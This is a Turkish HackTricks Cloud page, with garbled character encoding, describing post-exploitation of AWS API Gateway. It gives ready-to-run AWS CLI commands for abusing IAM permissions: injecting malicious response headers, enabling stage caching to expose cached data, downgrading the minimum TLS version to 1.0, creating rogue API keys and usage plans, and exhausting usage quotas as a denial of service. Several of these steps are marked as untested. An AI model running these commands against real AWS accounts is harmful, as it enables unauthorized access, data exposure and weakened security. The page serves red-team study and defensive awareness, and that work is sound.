# AWS - API Gateway SonrasÄ± SÄ±zma

<details>

<summary><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## API Gateway

Daha fazla bilgi iÃ§in kontrol edin:

{% content-ref url="../aws-services/aws-api-gateway-enum.md" %}
[aws-api-gateway-enum.md](../aws-services/aws-api-gateway-enum.md)
{% endcontent-ref %}

### EriÅŸimi olmayan API'lere EriÅŸim

[https://us-east-1.console.aws.amazon.com/vpc/home#CreateVpcEndpoint](https://us-east-1.console.aws.amazon.com/vpc/home?region=us-east-1#CreateVpcEndpoint:) adresinde com.amazonaws.us-east-1.execute-api hizmetiyle bir uÃ§ nokta oluÅŸturabilir, eriÅŸiminizi olan bir aÄŸda (potansiyel olarak bir EC2 makinesi aracÄ±lÄ±ÄŸÄ±yla) uÃ§ noktayÄ± aÃ§abilir ve tÃ¼m baÄŸlantÄ±lara izin veren bir gÃ¼venlik grubu atayabilirsiniz.\
ArdÄ±ndan, EC2 makinesinden uÃ§ noktaya eriÅŸebilir ve dolayÄ±sÄ±yla daha Ã¶nce aÃ§Ä±ÄŸa Ã§Ä±karÄ±lmamÄ±ÅŸ olan aÄŸ geÃ§idini API'sini Ã§aÄŸÄ±rabilirsiniz.

### KullanÄ±m PlanlarÄ± DoS

**Enumeration** bÃ¶lÃ¼mÃ¼nde anahtarlarÄ±n **kullanÄ±m planÄ±nÄ± nasÄ±l elde edeceÄŸinizi** gÃ¶rebilirsiniz. EÄŸer anahtara sahipseniz ve aylÄ±k olarak X kullanÄ±ma **sÄ±nÄ±rlÄ±ysa**, sadece kullanabilir ve bir DoS oluÅŸturabilirsiniz.

**API AnahtarÄ±**, **`x-api-key`** adÄ±nda bir **HTTP baÅŸlÄ±ÄŸÄ±** iÃ§inde **yer almalÄ±dÄ±r**.

### `apigateway:UpdateGatewayResponse`, `apigateway:CreateDeployment`

`apigateway:UpdateGatewayResponse` ve `apigateway:CreateDeployment` izinlerine sahip bir saldÄ±rgan, mevcut bir AÄŸ GeÃ§idi YanÄ±tÄ±nÄ± deÄŸiÅŸtirerek hassas bilgileri sÄ±zdÄ±ran veya kÃ¶tÃ¼ amaÃ§lÄ± komut dosyalarÄ±nÄ± Ã§alÄ±ÅŸtÄ±ran Ã¶zel baÅŸlÄ±klar veya yanÄ±t ÅŸablonlarÄ± ekleyebilir.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
RESPONSE_TYPE="DEFAULT_4XX"

# Update the Gateway Response
aws apigateway update-gateway-response --rest-api-id $API_ID --response-type $RESPONSE_TYPE --patch-operations op=replace,path=/responseTemplates/application~1json,value="{\"message\":\"$context.error.message\", \"malicious_header\":\"malicious_value\"}"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Potansiyel Etki**: Hassas bilgilerin sÄ±zdÄ±rÄ±lmasÄ±, kÃ¶tÃ¼ amaÃ§lÄ± komut dosyalarÄ±nÄ±n yÃ¼rÃ¼tÃ¼lmesi veya API kaynaklarÄ±na izinsiz eriÅŸim.

{% hint style="info" %}
Test gereklidir
{% endhint %}

### `apigateway:UpdateStage`, `apigateway:CreateDeployment`

`apigateway:UpdateStage` ve `apigateway:CreateDeployment` izinlerine sahip bir saldÄ±rgan, **mevcut bir API Gateway aÅŸamasÄ±nÄ± deÄŸiÅŸtirerek trafiÄŸi farklÄ± bir aÅŸamaya yÃ¶nlendirebilir veya Ã¶nbellekleme ayarlarÄ±nÄ± deÄŸiÅŸtirerek Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ verilere izinsiz eriÅŸim saÄŸlayabilir**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
STAGE_NAME="Prod"

# Update the API Gateway stage
aws apigateway update-stage --rest-api-id $API_ID --stage-name $STAGE_NAME --patch-operations op=replace,path=/cacheClusterEnabled,value=true,op=replace,path=/cacheClusterSize,value="0.5"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Potansiyel Etki**: Ã–nbelleÄŸe alÄ±nmÄ±ÅŸ verilere izinsiz eriÅŸim, API trafiÄŸini bozma veya onu ele geÃ§irme.

{% hint style="info" %}
Test gereklidir
{% endhint %}

### `apigateway:PutMethodResponse`, `apigateway:CreateDeployment`

`apigateway:PutMethodResponse` ve `apigateway:CreateDeployment` izinlerine sahip bir saldÄ±rgan, **mevcut bir API Gateway REST API yÃ¶nteminin yÃ¶ntem yanÄ±tÄ±nÄ± deÄŸiÅŸtirerek, hassas bilgileri sÄ±zdÄ±ran veya kÃ¶tÃ¼ amaÃ§lÄ± komut dosyalarÄ±nÄ± Ã§alÄ±ÅŸtÄ±ran Ã¶zel baÅŸlÄ±klar veya yanÄ±t ÅŸablonlarÄ± ekleyebilir**.
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
STATUS_CODE="200"

# Update the method response
aws apigateway put-method-response --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --status-code $STATUS_CODE --response-parameters "method.response.header.malicious_header=true"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Potansiyel Etki**: Hassas bilgilerin sÄ±zmasÄ±, zararlÄ± komut dosyalarÄ±nÄ±n yÃ¼rÃ¼tÃ¼lmesi veya API kaynaklarÄ±na izinsiz eriÅŸim.

{% hint style="info" %}
Test gereklidir.
{% endhint %}

### `apigateway:UpdateRestApi`, `apigateway:CreateDeployment`

`apigateway:UpdateRestApi` ve `apigateway:CreateDeployment` izinlerine sahip bir saldÄ±rgan, **API Gateway REST API ayarlarÄ±nÄ± deÄŸiÅŸtirerek gÃ¼nlÃ¼ÄŸÃ¼ devre dÄ±ÅŸÄ± bÄ±rakabilir veya minimum TLS sÃ¼rÃ¼mÃ¼nÃ¼ deÄŸiÅŸtirebilir, bu da API'nin gÃ¼venliÄŸini zayÄ±flatabilir**.
```bash
API_ID="your-api-id"

# Update the REST API settings
aws apigateway update-rest-api --rest-api-id $API_ID --patch-operations op=replace,path=/minimumTlsVersion,value='TLS_1.0',op=replace,path=/apiKeySource,value='AUTHORIZER'

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Potansiyel Etki**: API'nin gÃ¼venliÄŸini zayÄ±flatma, yetkisiz eriÅŸime izin verme veya hassas bilgilerin ortaya Ã§Ä±kmasÄ±na neden olma.

{% hint style="info" %}
Test gerekiyor
{% endhint %}

### `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, `apigateway:CreateUsagePlanKey`

`apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan` ve `apigateway:CreateUsagePlanKey` izinlerine sahip bir saldÄ±rgan, **yeni API anahtarlarÄ± oluÅŸturabilir, bunlarÄ± kullanÄ±m planlarÄ±yla iliÅŸkilendirebilir ve ardÄ±ndan bu anahtarlarÄ± yetkisiz API eriÅŸimi iÃ§in kullanabilir**.
```bash
# Create a new API key
API_KEY=$(aws apigateway create-api-key --enabled --output text --query 'id')

# Create a new usage plan
USAGE_PLAN=$(aws apigateway create-usage-plan --name "MaliciousUsagePlan" --output text --query 'id')

# Associate the API key with the usage plan
aws apigateway create-usage-plan-key --usage-plan-id $USAGE_PLAN --key-id $API_KEY --key-type API_KEY
```
**Potansiyel Etki**: Yetkisiz eriÅŸim API kaynaklarÄ±na, gÃ¼venlik kontrollerini atlayarak.

{% hint style="info" %}
Test gerekiyor
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
